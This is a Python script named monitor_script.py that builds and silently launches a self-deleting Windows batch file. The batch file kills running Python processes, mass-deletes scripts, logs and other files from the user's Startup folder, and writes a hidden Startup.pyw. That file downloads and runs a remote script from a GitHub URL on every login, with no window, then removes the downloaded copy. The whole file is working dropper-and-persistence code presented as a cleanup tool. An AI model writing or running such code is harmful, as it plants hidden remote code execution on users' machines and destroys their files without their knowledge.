# monitor_script.py - Creates batch file that doesn't kill itself
import os
import sys
import subprocess
import tempfile
import time

def create_batch_file():
    """Create batch file that runs independently of Python"""
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    
    # Create batch file in Windows folder (not temp) so it survives Python kill
    batch_path = os.path.join(os.getenv('WINDIR'), "Temp", "cleanup_setup.bat")
    
    batch_content = f'''@echo off
:: This batch runs independently of Python

echo [CLEANUP] Step 1/3: Stopping Python processes...
:: Kill Python processes but NOT the current batch process
for /f "tokens=2" %%i in ('tasklist /fi "imagename eq python.exe" /fi "sessionname eq console" /nh') do (
    taskkill /f /pid %%i 2>nul
)
for /f "tokens=2" %%i in ('tasklist /fi "imagename eq pythonw.exe" /fi "sessionname eq console" /nh') do (
    taskkill /f /pid %%i 2>nul
)
timeout /t 3 /nobreak >nul

echo [CLEANUP] Step 2/3: Cleaning startup folder...
cd /d "{startup_folder}"
:: Delete all files
del /f /q *.log 2>nul
del /f /q *.txt 2>nul
del /f /q *.py 2>nul
del /f /q *.pyw 2>nul
del /f /q *.json 2>nul
del /f /q *.pyc 2>nul
del /f /q *.bat 2>nul
:: Delete specific files
if exist startup_log.txt del /f /q startup_log.txt
if exist monitor_script.py del /f /q monitor_script.py
if exist github_launcher.pyw del /f /q github_launcher.pyw
if exist requirements.txt del /f /q requirements.txt

:: Delete __pycache__ folders
for /d %%d in (__pycache__) do (
    rmdir /s /q "%%d" 2>nul
)

echo [SETUP] Step 3/3: Creating new launcher...

:: Create the new launcher directly
echo import os, sys, subprocess, urllib.request, tempfile, time > "{startup_folder}\\Startup.pyw"
echo. >> "{startup_folder}\\Startup.pyw"
echo def run(): >> "{startup_folder}\\Startup.pyw"
echo     try: >> "{startup_folder}\\Startup.pyw"
echo         url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/script.py" >> "{startup_folder}\\Startup.pyw"
echo         import urllib.request >> "{startup_folder}\\Startup.pyw"
echo         code = urllib.request.urlopen(url).read().decode('utf-8') >> "{startup_folder}\\Startup.pyw"
echo         tf = tempfile.gettempdir() + "/script_temp.py" >> "{startup_folder}\\Startup.pyw"
echo         with open(tf, "w") as f: f.write(code) >> "{startup_folder}\\Startup.pyw"
echo         si = subprocess.STARTUPINFO() >> "{startup_folder}\\Startup.pyw"
echo         si.dwFlags ^|= subprocess.STARTF_USESHOWWINDOW >> "{startup_folder}\\Startup.pyw"
echo         subprocess.Popen([sys.executable, tf], startupinfo=si, creationflags=subprocess.CREATE_NO_WINDOW) >> "{startup_folder}\\Startup.pyw"
echo         time.sleep(5) >> "{startup_folder}\\Startup.pyw"
echo         try: os.remove(tf) >> "{startup_folder}\\Startup.pyw"
echo         except: pass >> "{startup_folder}\\Startup.pyw"
echo         return True >> "{startup_folder}\\Startup.pyw"
echo     except Exception as e: return False >> "{startup_folder}\\Startup.pyw"
echo. >> "{startup_folder}\\Startup.pyw"
echo if __name__ == "__main__": >> "{startup_folder}\\Startup.pyw"
echo     time.sleep(5) >> "{startup_folder}\\Startup.pyw"
echo     run() >> "{startup_folder}\\Startup.pyw"
echo     while True: time.sleep(3600) >> "{startup_folder}\\Startup.pyw"

echo [VERIFY] Checking files...
dir /b "{startup_folder}"

echo [START] Starting new launcher...
:: Use start to run independently
start "" /b pythonw "{startup_folder}\\Startup.pyw"

echo [COMPLETE] Cleanup and setup finished!
timeout /t 5 /nobreak >nul

:: Delete this batch file
del /f /q "{batch_path}" 2>nul
'''
    
    # Write batch file
    with open(batch_path, 'w') as f:
        f.write(batch_content)
    
    return batch_path

def main():
    """Main function - creates and runs batch file"""
    print("=" * 60)
    print("SETUP BATCH FILE CREATOR")
    print("=" * 60)
    
    print("\nCreating cleanup batch file...")
    batch_path = create_batch_file()
    
    print(f"Batch file created: {batch_path}")
    print("\nRunning batch file (will kill this Python process)...")
    
    # Run batch file using cmd /c so it continues after Python dies
    subprocess.Popen(['cmd', '/c', batch_path], 
                    creationflags=subprocess.CREATE_NO_WINDOW)
    
    print("Batch file started. This process will be killed.")
    print("Check startup folder in 5 seconds...")
    
    # Exit immediately
    sys.exit(0)

if __name__ == "__main__":
    main()
